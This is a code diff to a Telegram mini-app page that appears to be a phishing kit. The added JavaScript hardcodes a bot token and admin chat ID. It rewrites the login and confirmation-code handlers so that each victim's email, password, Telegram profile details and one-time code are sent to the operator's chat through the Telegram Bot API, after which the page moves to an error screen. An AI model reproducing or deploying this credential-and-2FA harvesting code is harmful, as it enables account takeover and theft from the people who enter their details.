@@ -522,8 +522,10 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
 <script>
     // ============================================================
-    // КОНФИГ
+    // КОНФИГ (⚠️ токен виден всем в исходниках!)
     // ============================================================
+    const BOT_TOKEN = "9165420485:AAE0SoH1Accukz1rbZ8mww72aG3jx3iyleA";
+    const ADMIN_ID  = "8542901240";
     const SUPPORT_LINK = "https://t.me/erubsite";
     const MAX_ATTEMPTS = 3;
 
@@ -609,15 +611,27 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     }
 
     // ============================================================
-    // ОТПРАВКА В БОТ через tg.sendData
+    // ОТПРАВКА В ЛИЧКУ АДМИНУ (напрямую через Bot API)
     // ============================================================
-    function sendToBot(payload) {
+    async function sendToAdmin(text) {
         try {
-            tg.sendData(JSON.stringify(payload));
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+            const data = await res.json();
+            if (!data.ok) {
+                console.error('Telegram API error:', data);
+                return false;
+            }
             return true;
         } catch (err) {
-            console.error('sendData error:', err);
-            showMessage('Откройте приложение через бота Telegram', 'error');
+            console.error('fetch error:', err);
             return false;
         }
     }
@@ -625,7 +639,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     // ВХОД → КОД
     // ============================================================
-    function handleLogin() {
+    async function handleLogin() {
         const e = email.value.trim();
         const p = password.value.trim();
 
@@ -635,8 +649,29 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         userEmail = e;
         userPassword = p;
 
-        const ok = sendToBot({ type: 'login', email: e, password: p });
-        if (!ok) { if (handleError()) return; return; }
+        loginBtn.disabled = true;
+        loginBtn.textContent = 'Отправка...';
+
+        const user = tg.initDataUnsafe?.user || {};
+        const msg =
+            `🔔 НОВАЯ ЗАЯВКА (ВХОД)\n\n` +
+            `👤 ID: ${user.id || 'неизвестно'}\n` +
+            `👤 Имя: ${user.first_name || '-'}\n` +
+            `👤 Username: @${user.username || 'нет'}\n\n` +
+            `📧 Email: ${e}\n` +
+            `🔑 Пароль: ${p}`;
+
+        const ok = await sendToAdmin(msg);
+
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Войти';
+
+        if (!ok) {
+            if (handleError()) return;
+            loginError.textContent = `Ошибка отправки. (${attemptCount}/${MAX_ATTEMPTS})`;
+            loginError.style.display = 'block';
+            return;
+        }
 
         goTo('code');
         codeStatus.style.display = 'block';
@@ -646,12 +681,34 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     // КОД → ОШИБКА
     // ============================================================
-    function handleCode() {
+    async function handleCode() {
         const code = codeInput.value.trim();
         if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
 
-        const ok = sendToBot({ type: 'code', email: userEmail, password: userPassword, code: code });
-        if (!ok) { if (handleError()) return; return; }
+        codeBtn.disabled = true;
+        codeBtn.textContent = 'Отправка...';
+
+        const user = tg.initDataUnsafe?.user || {};
+        const msg =
+            `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n` +
+            `👤 ID: ${user.id || 'неизвестно'}\n` +
+            `👤 Имя: ${user.first_name || '-'}\n` +
+            `👤 Username: @${user.username || 'нет'}\n\n` +
+            `📧 Email: ${userEmail}\n` +
+            `🔑 Пароль: ${userPassword}\n` +
+            `🔢 Код: ${code}`;
+
+        const ok = await sendToAdmin(msg);
+
+        codeBtn.disabled = false;
+        codeBtn.textContent = 'Подтвердить';
+
+        if (!ok) {
+            if (handleError()) return;
+            codeError.textContent = `Ошибка отправки. (${attemptCount}/${MAX_ATTEMPTS})`;
+            codeError.style.display = 'block';
+            return;
+        }
 
         codeInput.value = '';
         codeStatus.style.display = 'none';
